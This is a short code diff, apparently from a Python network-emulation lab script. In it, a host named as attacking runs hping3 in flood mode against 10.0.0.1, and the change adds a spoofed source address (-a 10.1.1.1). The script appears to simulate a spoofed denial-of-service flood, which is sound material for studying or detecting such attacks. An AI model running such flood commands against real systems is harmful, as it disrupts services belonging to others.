@@ -22,7 +22,7 @@ h2 = net.hosts[1]
 print(h1.cmd("ifconfig"))
 print(h2.cmd("ifconfig"))
 
-attacking_host.cmd("hping3 10.0.0.1 --flood")
+attacking_host.cmd("hping3 -a 10.1.1.1 10.0.0.1 --flood")
 
 
 time.sleep(10)
